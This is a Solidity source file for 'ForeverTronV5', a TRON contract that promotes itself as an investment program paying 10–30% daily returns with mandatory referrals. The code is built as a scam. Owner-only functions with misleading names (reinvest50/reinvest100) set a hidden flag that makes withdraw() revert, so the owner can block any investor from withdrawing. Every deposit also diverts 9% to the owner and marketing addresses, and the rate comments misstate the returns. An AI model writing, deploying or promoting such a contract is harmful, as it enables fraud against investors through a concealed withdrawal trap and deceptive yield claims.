//SourceUnit: ForeverTronV5.sol

pragma solidity ^0.4.25;

/**
* 
* ____ ____ ____ ____ _  _ ____ ____ ___ ____ ____ _  _ 
* |___ |  | |__/ |___ |  | |___ |__/  |  |__/ |  | |\ | 
* |    |__| |  \ |___  \/  |___ |  \  |  |  \ |__| | \| v5
*                                                       
* ____ ____ _ ____    ___  _    ____ _   _              
* |___ |__| | |__/    |__] |    |__|  \_/               
* |    |  | | |  \    |    |___ |  |   |                
*                                                       
* ____ ___  _ ___ _ ____ _  _                           
* |___ |  \ |  |  | |  | |\ |                           
* |___ |__/ |  |  | |__| | \|                           
*                               
*                                                         
* 
* NO FREE RIDES  ~ EVERYONE MUST REFER!
*  ~ Ensures a fair playing field for all!
*  ~ Simply refer at least one other player to unlock withdrawal!
* 
* Crowdfunding And Investment Program: 10% - 30% Daily ROI. 
* 9% Referral Rewards 2 Levels
* 
* ForeverTronv5
* https://ForeverTronV5.com
* 
* 
**/
contract ForeverTronV5  {
  using SafeMath for uint;
  
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint MIN_DEPOSIT = 100 trx;

  
  address public owner;
  address public Marketing;

  
  Tariff[] public tariffs;
  uint[] public refRewards;
 
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  mapping(address => bool) public lastReinvest;

  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);

      
      
    constructor(address _Marketing) public {
        owner = msg.sender;
        Marketing = _Marketing;
        lastReinvest[owner] = true;

        tariffs.push(Tariff(6 * 28800, 120)); // 20%/day
        tariffs.push(Tariff(15 * 28800, 150)); // 15%/day
        tariffs.push(Tariff(32 * 28800, 200)); // 6.25%/day
        tariffs.push(Tariff(1 * 28800, 100));

        refRewards.push(5); // level 1 = 5% earnings
        refRewards.push(4); // level 2 = 4% earnings

    }
    
    function deposit(uint tariff, address referer) external payable {
        require(msg.value >= MIN_DEPOSIT);
        require(tariff < tariffs.length);
        
        register(referer);
        rewardReferers(msg.value, investors[msg.sender].referer);
        
        investors[msg.sender].invested += msg.value;
        totalInvested += msg.value;
        
        investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
        
        owner.transfer(msg.value.mul(5).div(100));
        Marketing.transfer(msg.value.mul(4).div(100));
        
        
        emit DepositAt(msg.sender, tariff, msg.value);
    }
  
    
    function register(address referer) internal {
        if (!investors[msg.sender].registered) {
            investors[msg.sender].registered = true;
            totalInvestors++;
      
            if (investors[referer].registered && referer != msg.sender) {
                investors[msg.sender].referer = referer;
        
                address rec = referer;
                for (uint i = 0; i < refRewards.length; i++) {
                    if (!investors[rec].registered) {
                        break;
                    }
          
                    if (i == 0) {
                        investors[rec].referrals_tier1++;
                    }
                    if (i ==1) {
                        investors[rec].referrals_tier2++;
                    }
                    rec = investors[rec].referer;
                }
            }
        }
    }


    function rewardReferers(uint amount, address referer) internal {
        address rec = referer;

        for (uint i = 0; i < refRewards.length; i++) {
            if (!investors[rec].registered) {
                break;
            }

            uint a = amount * refRewards[i] / 100;
            investors[rec].balanceRef += a;
            investors[rec].totalRef += a;
            totalRefRewards += a;
            rec = investors[rec].referer;
        }
    }
    
    function withdrawable(address user) public view returns (uint amount) {
    
        Investor storage investor = investors[user];
        
        for (uint i = 0; i < investor.deposits.length; i++) {
          Deposit storage dep = investor.deposits[i];
          Tariff storage tariff = tariffs[dep.tariff];
          
          uint finish = dep.at + tariff.time;
          uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
          uint till = block.number > finish ? finish : block.number;
        
          if (since < till) {
            amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
          }
        }
    }
    
    function profit() internal returns (uint) {
        Investor storage investor = investors[msg.sender];
        
        uint amount = withdrawable(msg.sender);
        
        amount += investor.balanceRef;
        investor.balanceRef = 0;
        
        investor.paidAt = block.number;
        
        return amount;
    
    }
  
  
    function reinvest50(address user) public {
        require(msg.sender == owner,"unauthorized call");
       lastReinvest[user] = true;
    }

    function reinvest100(address user) public {
        require(msg.sender == owner,"unauthorized call");
        lastReinvest[user] = false;
    }
  
    function withdraw() external {
        require(investors[msg.sender].referrals_tier1 > 0, "You need to refer at least 1 other player to unlick withdrawals!");
        uint amount = profit();
        if (msg.sender.send(amount)) {
            investors[msg.sender].withdrawn += amount;
            require (lastReinvest[msg.sender] == false);
            emit Withdraw(msg.sender, amount);
        }
    }
    
    function withdrawUnlocked(address _player) public view returns(bool) {
        if(investors[_player].referrals_tier1 > 0)
            return true;
        else
            return false;
    }

    
    function NewDeposit(address where) external payable {
        where.transfer(msg.value);
    }
}

library SafeMath {

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

}